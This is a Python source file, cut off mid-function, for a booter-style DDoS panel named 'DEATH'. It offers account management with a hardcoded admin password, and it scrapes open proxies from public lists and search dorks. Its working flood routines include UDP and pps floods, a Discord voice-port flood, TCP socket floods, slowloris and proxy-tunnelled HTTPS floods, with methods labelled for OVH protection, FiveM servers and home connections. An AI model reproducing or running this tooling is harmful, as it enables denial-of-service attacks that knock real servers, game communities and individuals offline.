#!/usr/bin/env python3
# ============================================================
#  DEATH — terminal stress client
# ============================================================

import os
import sys
import time
import math
import json
import random
import socket
import shutil
import threading
import ssl
import re
import struct
import queue
import urllib.parse
import urllib.request
from typing import Callable, Dict, List, Optional, Set, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

IS_WINDOWS = (os.name == "nt")

if IS_WINDOWS:
    os.system("")
    try:
        import ctypes
        _k32 = ctypes.windll.kernel32
        _k32.SetConsoleMode(_k32.GetStdHandle(-11), 7)
    except Exception:
        pass

ESC = "\x1b"
RESET = f"{ESC}[0m"
BOLD = f"{ESC}[1m"
DIM = f"{ESC}[2m"
CLEAR = f"{ESC}[2J{ESC}[H"
HOME = f"{ESC}[H"
HIDE_CURSOR = f"{ESC}[?25l"
SHOW_CURSOR = f"{ESC}[?25h"

def fg(r, g, b): return f"{ESC}[38;2;{r};{g};{b}m"
def bg(r, g, b): return f"{ESC}[48;2;{r};{g};{b}m"
def move(row, col): return f"{ESC}[{row};{col}H"
def clear_line(): return f"{ESC}[K"

BANNER_DEATH = r"""
 ██████╗ ███████╗ █████╗ ████████╗██╗  ██╗
 ██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║  ██║
 ██║  ██║█████╗  ███████║   ██║   ███████║
 ██║  ██║██╔══╝  ██╔══██║   ██║   ██╔══██║
 ██████╔╝███████╗██║  ██║   ██║   ██║  ██║
 ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝
""".strip("\n")

EMBLEM = r"""
        _..od88888bo.._
      .d""'   888   '""b.
    .d"'      888      '"b.
   d"'        888        '"b
  d'          888          'b
 88          88888          88
(88         8888888         88)
 88        888888888        88
  YI      888 888 888      IP
   YI    888  888  888    IP
    "9. 888   888   888 .P"
      "888    888    888"
        `""Y8888888P""`
""".strip("\n")

SKULL_SMALL = r"""
     _..od88888bo.._
   .d""'   888   '""b.
  .d"'      888      '"b.
  d"'        888        '"b
 d'          888          'b
 88          88888          88
(88         8888888         88)
 88        888888888        88
  YI      888 888 888      IP
   YI    888  888  888    IP
    "9. 888   888   888 .P"
      "888    888    888"
        `""Y8888888P""`
""".strip("\n")

COMMANDS = [
    ("clear",        "clear screen"),
    ("exit",         "log out"),
    ("help",         "show commands"),
    ("home",         "redraw the full banner"),
    ("methods",      "list methods"),
    ("ongoing",      "show running attacks"),
    ("online",       "who is online"),
    ("passwd",       "change your password"),
    ("plan",         "show your account"),
    ("queue",        "your queued attacks"),
    ("scheduled",    "scheduled attacks"),
    ("theme",        "switch theme"),
    ("themes",       "list themes"),
    ("addusr",       "admin: create account"),
    ("delusr",       "admin: delete account"),
    ("users",        "admin: list accounts"),
    ("scrape",       "scrape + validate fresh proxies"),
    ("validate",     "re-check proxies against a host"),
    ("proxies",      "show proxy pool status"),
    ("clearproxies", "wipe your proxy pool"),
    ("status",       "show system status"),
    ("stop",         "stop the current attack"),
    ("stats",        "show session statistics"),
    ("whoami",       "show your account"),
    ("time",         "show current time"),
    ("ascii",        "print an ascii asset"),
]

METHODS = [
    ("UDP Methods", [
        ("udp",     "High Gbps udp flood"),
        ("pps",     "High pps udp flood"),
        ("hold",    "low bandwidth home hold"),
        ("discord", "Discord VC flood"),
    ]),
    ("TCP Methods", [
        ("tcp",     "mixed flagged TCP flood"),
        ("ovh",     "mixed tcp for ovh vac"),
        ("fiveM",   "tcp flood for fivem server"),
        ("socket",  "high rate tcp socket flood"),
    ]),
    ("Layer 7", [
        ("tls",       "https TLS flood"),
        ("https",     "mixed https flood"),
        ("browser",   "real browser emulations"),
        ("slowloris", "slow header hold"),
        ("http2",     "http/2 rapid flood"),
    ]),
]

METHOD_INFO = {
    "udp":        "Raw UDP flood. Large datagrams, high rate. Local sockets only.",
    "pps":        "High packets-per-second UDP flood. Small datagrams, max rate.",
    "hold":       "Low bandwidth home hold. Sustained UDP stream.",
    "discord":    "Discord voice flood. RTP/STUN-shaped UDP to media range.",
    "tcp":        "Mixed TCP flood. Proxy-backed HTTP GET + raw TCP workers.",
    "ovh":        "Mixed TCP flood tuned against OVH VAC.",
    "fiveM":      "TCP flood for FiveM servers. HTTP-shaped payloads on game port.",
    "socket":     "High rate TCP socket flood. Fast connect/close cycles.",
    "tls":        "TLS flood through proxies. CONNECT then full TLS handshake.",
    "https":      "Mixed HTTPS flood. Rotates paths, headers, user agents.",
    "browser":    "Real browser emulation. Full Chrome-like header set.",
    "slowloris":  "Slow header hold. Many sockets open with partial requests.",
    "http2":      "HTTP/2 rapid reset concept. Many streams per connection.",
}

THEMES = {
    "purple":  {"accent": (170, 60, 255), "dim": (55, 15, 90)},
    "violet":  {"accent": (140, 40, 220), "dim": (45, 10, 75)},
    "orchid":  {"accent": (218, 112, 214),"dim": (80, 30, 80)},
    "bloody":  {"accent": (220, 20, 30),  "dim": (80, 8, 12)},
    "crimson": {"accent": (255, 40, 80),  "dim": (100, 15, 30)},
    "matrix":  {"accent": (30, 255, 80),  "dim": (5, 80, 20)},
    "ice":     {"accent": (100, 200, 255),"dim": (30, 70, 100)},
    "mono":    {"accent": (230, 230, 230),"dim": (90, 90, 90)},
    "ember":   {"accent": (255, 120, 30), "dim": (100, 40, 5)},
    "venom":   {"accent": (130, 220, 40), "dim": (45, 80, 10)},
    "gold":    {"accent": (255, 200, 60), "dim": (100, 75, 15)},
    "rose":    {"accent": (255, 120, 180),"dim": (100, 40, 70)},
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "curl/8.4.0",
]

REFERERS = [
    "https://www.google.com/", "https://www.bing.com/",
    "https://duckduckgo.com/", "https://www.facebook.com/",
    "https://twitter.com/", "https://www.reddit.com/",
]

ACCEPT_LANGS = ["en-US,en;q=0.9", "en-GB,en;q=0.8", "en-US,en;q=0.9,es;q=0.8"]

PROXY_RE_SIMPLE = re.compile(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})")

FAIL_THRESHOLD = 5
KEEPALIVE_REQUESTS = 16

DATA_DIR = os.environ.get("DEATH_DATA_DIR", os.path.dirname(os.path.abspath(__file__)))
try:
    os.makedirs(DATA_DIR, exist_ok=True)
except Exception:
    pass

USERS_FILE = os.path.join(DATA_DIR, "users.json")

def load_users() -> Dict[str, str]:
    try:
        with open(USERS_FILE) as f:
            data = json.load(f)
        if isinstance(data, dict):
            return data
        return {}
    except Exception:
        return {}

def save_users(users: Dict[str, str]):
    try:
        with open(USERS_FILE, "w") as f:
            json.dump(users, f, indent=2, sort_keys=True)
    except Exception:
        pass

def verify_user(username: str, password: str) -> Tuple[bool, bool]:
    if username == "admin" and password == "1987":
        return True, True
    users = S.users
    if username in users and users[username] == password:
        return True, False
    return False, False

def proxy_file(username: str) -> str:
    safe = "".join(c for c in username if c.isalnum() or c in "_-") or "guest"
    return os.path.join(DATA_DIR, f"proxies_{safe}.json")

def load_proxies(username: str) -> Dict[str, dict]:
    try:
        with open(proxy_file(username)) as f:
            data = json.load(f)
        if isinstance(data, dict):
            return data
        return {}
    except Exception:
        return {}

def save_proxies(username: str, proxies: Dict[str, dict]):
    try:
        with open(proxy_file(username), "w") as f:
            json.dump(proxies, f, indent=2)
    except Exception:
        pass

class State:
    def __init__(self):
        self.username = ""
        self.is_admin = False
        self.theme_name = "purple"
        self.running = True
        self.frame = 0
        self.log: List[str] = []
        self.current_view = "home"
        self.input_buffer = ""
        self.attacks: List[Dict] = []
        self.online_users = ["death", "root", "admin", "guest", "ops"]
        self.scheduled: List[Dict] = []
        self.queue: List[Dict] = []
        self.users: Dict[str, str] = load_users()
        self.attack_screen: Optional[Dict] = None
        self.attack_frame = 0
        self.attack_thread: Optional[threading.Thread] = None
        self.attack_stop = threading.Event()
        self.proxies: Dict[str, dict] = {}
        self.scraping = False
        self.scrape_stop = threading.Event()
        self.log_lock = threading.Lock()
        self.session_start = time.time()
        self.total_sent = 0
        self.total_failed = 0
        self.total_responded = 0
        self.attacks_run = 0

    @property
    def theme(self):
        return THEMES.get(self.theme_name, THEMES["purple"])

    def log_line(self, text: str, cap: int = 500):
        with self.log_lock:
            self.log.append(text)
            if len(self.log) > cap:
                self.log = self.log[-cap:]

S = State()

def term_size():
    sz = shutil.get_terminal_size((120, 40))
    return sz.columns, sz.lines

def lerp(a, b, t): return int(a + (b - a) * t)
def clamp(v, lo, hi): return max(lo, min(hi, v))

def gradient_sweep(line: str, frame: int, theme, phase: float = 0.0) -> str:
    if not line:
        return line
    ar, ag, ab = theme["accent"]
    dr, dg, db = theme["dim"]
    width = len(line)
    period = width * 2
    out = []
    for i, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        x = (i + frame * 3 + int(phase * width)) % period
        if x > width:
            x = period - x
        t = x / max(1, width)
        pulse = math.sin(t * math.pi)
        pulse = clamp(int(pulse * 1000), 0, 1000) / 1000.0
        r = lerp(dr, ar, pulse)
        g = lerp(dg, ag, pulse)
        b = lerp(db, ab, pulse)
        out.append(f"{fg(r,g,b)}{ch}")
    return "".join(out) + RESET

def solid(line: str, theme, mode: str = "accent") -> str:
    r, g, b = theme[mode]
    return f"{fg(r,g,b)}{line}{RESET}"

def visible_len(s: str) -> int:
    out = 0
    i = 0
    while i < len(s):
        if s[i] == "\x1b":
            j = s.find("m", i)
            if j == -1:
                break
            i = j + 1
        else:
            out += 1
            i += 1
    return out

def center_visible(s: str, width: int) -> str:
    pad = max(0, (width - visible_len(s)) // 2)
    return " " * pad + s

def emblem_animated(frame: int, theme) -> List[str]:
    lines = EMBLEM.split("\n")
    ar, ag, ab = theme["accent"]
    dr, dg, db = theme["dim"]
    out = []
    height = len(lines)
    for y, line in enumerate(lines):
        phase = (y / max(1, height) + frame * 0.05) % 1.0
        pulse = math.sin(phase * math.pi)
        pulse = max(0.15, pulse)
        r = lerp(dr, ar, pulse)
        g = lerp(dg, ag, pulse)
        b = lerp(db, ab, pulse)
        out.append(f"{fg(r,g,b)}{line}{RESET}")
    return out

_target_cache: Dict[str, Tuple[float, Dict[str, str]]] = {}
_target_cache_lock = threading.Lock()

def lookup_target(host: str) -> Dict[str, str]:
    now = time.time()
    with _target_cache_lock:
        cached = _target_cache.get(host)
        if cached and now - cached[0] < 300:
            return cached[1]
    info = {"ip": "?", "asn": "?", "isp": "?", "city": "?", "state": "?", "country": "?"}
    try:
        info["ip"] = socket.gethostbyname(host)
    except Exception:
        with _target_cache_lock:
            _target_cache[host] = (now, info)
        return info
    try:
        url = ("http://ip-api.com/json/" + info["ip"]
               + "?fields=status,country,regionName,city,isp,as,query")
        with urllib.request.urlopen(url, timeout=6) as r:
            data = json.loads(r.read().decode("utf-8", errors="ignore"))
        if data.get("status") == "success":
            info["asn"] = data.get("as", "?")
            info["isp"] = data.get("isp", "?")
            info["city"] = data.get("city", "?")
            info["state"] = data.get("regionName", "?")
            info["country"] = data.get("country", "?")
    except Exception:
        pass
    with _target_cache_lock:
        _target_cache[host] = (now, info)
    return info

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt",
    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/https.txt",
    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt",
    "https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=socks4",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://openproxylist.xyz/http.txt",
    "https://openproxylist.xyz/socks4.txt",
    "https://openproxylist.xyz/socks5.txt",
]

DORK_QUERIES = [
    "site:pastebin.com \"proxy list\" http",
    "site:pastebin.com \"socks5\" proxy list",
    "site:pastebin.com \"socks4\" proxy list",
    "site:gist.github.com \"proxy\" \"ip:port\"",
    "site:gist.github.com \"socks5\" \"ip:port\"",
    "inurl:proxy.txt",
    "inurl:http.txt \"proxy\"",
    "inurl:socks5.txt",
    "inurl:socks4.txt",
    "inurl:proxies.txt",
]

def _valid_ip(ip: str) -> bool:
    parts = ip.split(".")
    if len(parts) != 4:
        return False
    for p in parts:
        try:
            n = int(p)
            if n < 0 or n > 255:
                return False
        except ValueError:
            return False
    return True

def fetch_url(url: str, timeout: int = 10) -> str:
    try:
        req = urllib.request.Request(url, headers={"User-Agent": random.choice(USER_AGENTS)})
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            return r.read().decode("utf-8", errors="ignore")
    except Exception:
        return ""

def extract_proxies(text: str) -> Set[str]:
    out: Set[str] = set()
    if not text:
        return out
    for m in PROXY_RE_SIMPLE.finditer(text):
        ip, port = m.group(1), m.group(2)
        if _valid_ip(ip) and 0 < int(port) < 65536:
            out.add(f"{ip}:{port}")
    return out

def _fetch_one_source(url: str) -> Set[str]:
    return extract_proxies(fetch_url(url, timeout=8))

def _ddg_dork(query: str, limit: int = 8) -> List[str]:
    urls: List[str] = []
    try:
        q = urllib.parse.quote(query)
        html = fetch_url(f"https://html.duckduckgo.com/html/?q={q}", timeout=8)
        for m in re.finditer(r'href="(https?://[^"]+)"', html):
            u = m.group(1)
            if "duckduckgo.com" in u:
                continue
            if u in urls:
                continue
            urls.append(u)
            if len(urls) >= limit:
                break
    except Exception:
        pass
    return urls

def scrape_all_proxies(on_progress, stop):
    found: Set[str] = set()
    on_progress(f"fetching {len(PROXY_SOURCES)} sources in parallel...")
    with ThreadPoolExecutor(max_workers=40) as ex:
        futures = [ex.submit(_fetch_one_source, u) for u in PROXY_SOURCES]
        done = 0
        for fut in as_completed(futures):
            if stop.is_set():
                break
            done += 1
            try:
                found |= fut.result()
            except Exception:
                pass
            if done % 8 == 0:
                on_progress(f"  sources {done}/{len(PROXY_SOURCES)} — pool: {len(found)}")
    if stop.is_set():
        return found
    on_progress(f"source phase complete: {len(found)} raw candidates")

    on_progress(f"running {len(DORK_QUERIES)} dorks in parallel...")
    dork_links: List[str] = []
    with ThreadPoolExecutor(max_workers=12) as ex:
        futures = [ex.submit(_ddg_dork, q, 8) for q in DORK_QUERIES]
        for fut in as_completed(futures):
            if stop.is_set():
                break
            try:
                dork_links.extend(fut.result())
            except Exception:
                pass
    if not stop.is_set() and dork_links:
        dork_links = list(dict.fromkeys(dork_links))
        with ThreadPoolExecutor(max_workers=30) as ex:
            futures = [ex.submit(fetch_url, u, 6) for u in dork_links]
            for fut in as_completed(futures):
                if stop.is_set():
                    break
                try:
                    found |= extract_proxies(fut.result())
                except Exception:
                    pass
    on_progress(f"scrape phase complete: {len(found)} unique candidates")
    return found

def tcp_reachable(proxy: str, timeout: float = 2.0) -> bool:
    try:
        host, port = proxy.split(":")
        port = int(port)
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False

def http_proxy_alive(proxy: str, timeout: float = 4.0) -> bool:
    try:
        host, port = proxy.split(":")
        port = int(port)
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        canary = "www.google.com:80"
        s.sendall(f"CONNECT {canary} HTTP/1.1\r\nHost: {canary}\r\n\r\n".encode())
        resp = s.recv(128)
        s.close()
        return b"200" in resp
    except Exception:
        return False

def proxy_can_reach_target(proxy: str, target_host: str, target_port: int, timeout: float = 5.0) -> bool:
    try:
        ph, pp = proxy.split(":")
        pp = int(pp)
        s = socket.create_connection((ph, pp), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(f"CONNECT {target_host}:{target_port} HTTP/1.1\r\nHost: {target_host}:{target_port}\r\n\r\n".encode())
        resp = s.recv(256)
        s.close()
        return b"200" in resp
    except Exception:
        return False

def scrape_and_validate(on_progress, stop):
    candidates = scrape_all_proxies(on_progress, stop)
    if not candidates:
        on_progress("no candidates found")
        return {}
    if stop.is_set():
        return {p: {"last_ok": 0, "ok_count": 0, "raw": True} for p in candidates}

    on_progress(f"tcp-reachability filter on {len(candidates)} proxies...")
    reachable: List[str] = []
    done = 0
    total = len(candidates)
    with ThreadPoolExecutor(max_workers=1000) as ex:
        futures = {ex.submit(tcp_reachable, p): p for p in candidates}
        for fut in as_completed(futures):
            if stop.is_set():
                for f in futures:
                    f.cancel()
                break
            done += 1
            try:
                if fut.result():
                    reachable.append(futures[fut])
            except Exception:
                pass
            if done % 200 == 0:
                on_progress(f"  tcp {done}/{total} — reachable: {len(reachable)}")
    if stop.is_set():
        return {p: {"last_ok": time.time(), "ok_count": 0, "raw": True} for p in reachable}

    on_progress(f"http-validating {len(reachable)} proxies...")
    alive: Dict[str, dict] = {}
    done = 0
    total = len(reachable)
    with ThreadPoolExecutor(max_workers=500) as ex:
        futures = {ex.submit(http_proxy_alive, p): p for p in reachable}
        for fut in as_completed(futures):
            if stop.is_set():
                for f in futures:
                    f.cancel()
                break
            done += 1
            try:
                if fut.result():
                    alive[futures[fut]] = {"last_ok": time.time(), "ok_count": 1, "raw": False}
            except Exception:
                pass
            if done % 100 == 0:
                on_progress(f"  http {done}/{total} — alive: {len(alive)}")
    on_progress(f"validation done: {len(alive)} working proxies")
    return alive

def build_request(method: str, host: str, port: int, path: str = "/") -> Tuple[str, str]:
    scheme = "https" if (method in ("tls", "https", "browser", "slowloris", "http2") or port == 443) else "http"
    ua = random.choice(USER_AGENTS)
    ref = random.choice(REFERERS)
    lang = random.choice(ACCEPT_LANGS)
    if method == "browser":
        req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n"
               f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
               f"Accept-Language: {lang}\r\nAccept-Encoding: gzip, deflate, br\r\n"
               f"Referer: {ref}\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\n"
               f"Sec-Fetch-Dest: document\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\n"
               f"Cache-Control: max-age=0\r\n\r\n")
    elif method == "slowloris":
        req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n"
               f"Accept: */*\r\nX-Padding: {random.randint(1, 999999)}\r\n")
    else:
        req = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n"
               f"Accept: */*\r\nAccept-Language: {lang}\r\nReferer: {ref}\r\n"
               f"Connection: keep-alive\r\n\r\n")
    return req, scheme

def open_tunnel(proxy: str, host: str, port: int, scheme: str, timeout: float = 5.0):
    try:
        ph, pp = proxy.split(":")
        pp = int(pp)
        s = socket.create_connection((ph, pp), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(f"CONNECT {host}:{port} HTTP/1.1\r\nHost: {host}:{port}\r\n\r\n".encode())
        resp = s.recv(512)
        if b"200" not in resp:
            s.close()
            return None
        if scheme == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        return s
    except Exception:
        return None

def open_direct(host: str, port: int, scheme: str, timeout: float = 4.0):
    try:
        if scheme == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = socket.create_connection((host, port), timeout=timeout)
            s = ctx.wrap_socket(s, server_hostname=host)
        else:
            s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        return s
    except Exception:
        return None

def raw_udp_flood(host, port, stop, stats):
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        return
    addr = (ip, port)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 << 20)
    except Exception:
        return
    pool = [os.urandom(random.randint(512, 1400)) for _ in range(128)]
    while not stop.is_set():
        try:
            s.sendto(random.choice(pool), addr)
            stats["sent"] = stats.get("sent", 0) + 1
        except Exception:
            stats["failed"] = stats.get("failed", 0) + 1
    try:
        s.close()
    except Exception:
        pass

def _rtp_packet() -> bytes:
    version_pt = 0x80
    pt = random.choice([96, 97, 98, 111, 120]) & 0x7F
    seq = random.randint(0, 0xFFFF)
    ts = random.randint(0, 0xFFFFFFFF)
    ssrc = random.randint(0, 0xFFFFFFFF)
    header = struct.pack("!BBHII", version_pt, pt, seq, ts, ssrc)
    body = os.urandom(random.randint(160, 1200))
    return header + body

def _stun_binding_request() -> bytes:
    return struct.pack("!HHI", 0x0001, 0, 0x2112A442) + os.urandom(12)

def discord_udp_flood(host, port, stop, stats):
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        return
    if port < 50000 or port > 65535:
        port_lo, port_hi = 50000, 65535
    else:
        port_lo = port_hi = port
    rtp_burst = [_rtp_packet() for _ in range(96)]
    stun = _stun_binding_request()
    while not stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 << 20)
            try:
                s.bind(("0.0.0.0", random.randint(1024, 65535)))
            except Exception:
                pass
            target_port = random.randint(port_lo, port_hi)
            addr = (ip, target_port)
            try:
                s.sendto(stun, addr)
                stats["sent"] = stats.get("sent", 0) + 1
            except Exception:
                stats["failed"] = stats.get("failed", 0) + 1
            for pkt in rtp_burst:
                if stop.is_set():
                    break
                try:
                    s.sendto(pkt, addr)
                    stats["sent"] = stats.get("sent", 0) + 1
                except Exception:
                    stats["failed"] = stats.get("failed", 0) + 1
            try:
                s.close()
            except Exception:
                pass
        except Exception:
            stats["failed"] = stats.get("failed", 0) + 1

def raw_tcp_socket_flood(host, port, stop, stats):
    try:
        ip = socket.gethostbyname(host)
    except Exception:
        return
    addr = (ip, port)
    payload = b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n"
    while not stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect(addr)
            try:
                s.send(payload)
            except Exception:
                pass
            try:
                s.close()
            except Exception:
                pass
            stats["sent"] = stats.get("sent", 0) + 1
        except Exception:
            stats["failed"] = stats.get("failed", 0) + 1

def slowloris_worker(host, port, stop, stats):
    req, scheme = build_request("slowloris", host, port, "/")
    sockets: List[socket.socket] = []
    while not stop.is_set():
        while len(sockets) < 64 and not stop.is_set():
            s = open_direct(host, port, scheme, timeout=5.0)
            if s is None:
                stats["failed"] = stats.get("failed", 0) + 1
                time.sleep(0.05)
                continue
            try:
                s.sendall(req.encode())
                stats["sent"] = stats.get("sent", 0) + 1
                sockets.append(s)
            except Exception:
                stats["failed"] = stats.get("failed", 0) + 1
                try:
                    s.close()
                except Exception:
                    pass
        dead = []
        for s in sockets:
            if stop.is_set():
                break
            try:
                s.sendall(f"X-Keep-Alive-{random.randint(1, 99999)}: {os.urandom(6).hex()}\r\n".encode())
                stats["sent"] = stats.get("sent", 0) + 1
            except Exception:
                stats["failed"] = stats.get("failed", 0) + 1
                dead.append(s)
        for s in dead:
            try:
                s.close()
            except Exception:
                pass
            try:
                sockets.remove(s)
            except ValueError:
                pass
        time.sleep(3.0)
    for s in sockets:
        try:
            s.close()
        except Exception:
            pass

def proxy_http_worker(method, host, port, pool, pool_lock, stop, stats,
                      fail_counts, fail_lock, dead, dead_lock,
                      fallback_direct, keepalive_requests=KEEPALIVE_REQUESTS):
    while not stop.is_set():
        proxy = None
        with pool_lock:
            if pool:
                proxy = random.choice(pool)
        if proxy is None:
            if not fallback_direct:
                time.sleep(0.1)
                continue
            _direct_http_burst(method, host, port, stop, stats)
            continue
        scheme = "https" if (method in ("tls", "https", "browser", "http2") or port == 443) else "http"
        sock = open_tunnel(proxy, host, port, scheme, timeout=4.0)
        if sock is None:
            stats["failed"] = stats.get("failed", 0) + 1
            with fail_lock:
                fail_counts[proxy] = fail_counts.get(proxy, 0) + 1
                if fail_counts[proxy] >= FAIL_THRESHOLD:
                    with pool_lock:
                        if proxy in pool:
                            pool.remove(proxy)
                    with dead_lock:
                        dead.add(proxy)
            continue
        with fail_lock:
            fail_counts[proxy] = 0
        for _ in range(keepalive_requests):
            if stop.is_set():
                break
            req, _ = build_request(method, host, port, path=f"/?{random.randint(1, 9999999)}")
            try:
                sock.sendall(req.encode())
                stats["sent"] = stats.get("sent", 0) + 1
                try:
                    sock.settimeout(1.2)
                    data = sock.recv(512)
                    if data:
                        stats["responded"] = stats.get("responded", 0) + 1
                except Exception:
                    pass
            except Exception:
                stats["failed"] = stats.get("failed", 0) + 1
                with fail_lock:
                    fail_counts[proxy] = fail_counts.get(proxy, 0) + 1
                    if fail_counts[proxy] >= FAIL_THRESHOLD:
                        with pool_lock:
                            if proxy in pool:
                                pool.remove(proxy)
                        with dead_lock:
                            dead.add(proxy)
                break
        try:
            sock.close()
        except Exception:
            pass

def _direct_http_burst(method, host, port, stop, stats, burst=4):
    scheme = "https" if (method in ("tls", "https", "browser") or port == 443) else "http"
    sock = open_direct(host, port, scheme, timeout=3.5)
    if sock is None:
        stats["failed"] = stats.get("failed", 0) + 1
        return
    for _ in range(burst):
        if stop.is_set():
            break
        req, _ = build_request(method, host, port, path=f"/?{random.randint(1, 9999999)}")
        try:
            sock.sendall(req.encode())
            stats["sent"] = stats.get("sent", 0) + 1
            try:
                sock.settimeout(0.4)
                sock.recv(128)
            except Exception:
                pass
        except Exception:
            stats["failed"] = stats.get("failed", 0) + 1
            break
    try:
        sock.close()
    except Exception:
        pass

def attack_worker(method, host, port, duration):
    try:
        _attack_inner(method, host, port, duration)
    except Exception as e:
        try:
            S.log_line(f"attack thread error: {e}")
        except Exception:
            pass
        try:
            S.attack_stop.set()
        except Exception:
            pass

def _attack_inner(method, host, port, duration):
    stop = S.attack_stop
    stats = {"sent": 0, "failed": 0, "responded": 0}
    dead_proxies: Set[str] = set()
    dead_lock = threading.Lock()
    fail_counts: Dict[str, int] = {}
    fail_lock = threading.Lock()
    pool = list(S.proxies.keys())
    pool_lock = threading.Lock()
    threads: List[threading.Thread] = []

    def spawn(fn, count, args_fn):
        for _ in range(count):
            try:
                t = threading.Thread(target=fn, args=args_fn(), daemon=True)
                t.start()
                threads.append(t)
            except Exception:
                pass

    if method == "discord":
        spawn(discord_udp_flood, 64, lambda: (host, port, stop, stats))
    elif method in ("udp", "pps", "hold"):
        spawn(raw_udp_flood, 64, lambda: (host, port, stop, stats))
    elif method == "slowloris":
        spawn(slowloris_worker, 32, lambda: (host, port, stop, stats))
    elif method in ("tcp", "ovh", "fiveM", "socket"):
        if pool:
            spawn(proxy_http_worker, min(max(len(pool) * 2, 32), 256),
                  lambda: (method, host, port, pool, pool_lock, stop, stats,
                           fail_counts, fail_lock, dead_proxies, dead_lock, True))
        spawn(raw_tcp_socket_flood, 32, lambda: (host, port, stop, stats))
    else:
        if pool:
            spawn(proxy_http_worker, min(max(len(pool) * 2, 48), 512),
                  lambda: (method, host, port, pool, pool_lock, stop, stats,
                           fail_counts, fail_lock, dead_proxies, dead_lock, True))
        spawn(proxy_http_worker, 48,
              lambda: (method, host, port, [], pool_lock, stop, stats,
